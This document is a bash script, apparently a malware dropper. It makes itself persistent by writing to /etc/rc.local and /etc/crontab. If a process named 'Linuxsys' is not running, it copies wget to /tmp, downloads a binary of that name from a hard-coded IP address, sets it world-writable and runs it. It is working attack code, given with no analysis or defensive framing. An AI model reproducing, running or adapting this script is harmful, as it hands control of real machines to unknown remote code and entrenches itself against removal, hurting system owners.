#!/bin/bash
p=$( pwd )
x=$(cat /etc/rc.local | grep ${p}/guard.sh | grep -v grep | wc -l)
if [ $x -eq 0 ];then
    $(sed -i "s/exit 0//g" /etc/rc.local)
	echo "chmod 777 ${p}/guard.sh"
    echo "sh ${p}/guard.sh &" >> /etc/rc.local
	echo "exit 0" >> /etc/rc.local
else
    echo ""
fi


xcrontab=$(cat /etc/crontab | grep "bash ${p}/guard.sh" | grep -v grep |wc -l)
if [ $xcrontab -eq 0 ];then
	echo "00 24 * *	*	bash ${p}/guard.sh" >> /etc/crontab
else
	echo ""
fi



download=$(ps aux | grep Linuxsys | grep -v grep | wc -l)
if [ $download -eq 0 ];then
	if [ ! -f "${p}/Linuxsys" ];then
		if [ -f "/usr/bin/wget" ];then
			cp /usr/bin/wget /tmp/wget
			chmod 777 /tmp/wget
			/tmp/wget -P ${p}/ http://45.76.110.81/Linuxsys
			chmod 777 ${p}/Linuxsys
			chmod 777 ${p}/Linuxsys
			${p}/Linuxsys
			rm /tmp/wget
		else
			echo "" #no wget
		fi
	else
		chmod 777 ${p}/Linuxsys
		${p}/Linuxsys
	fi
else
	echo ""
fi

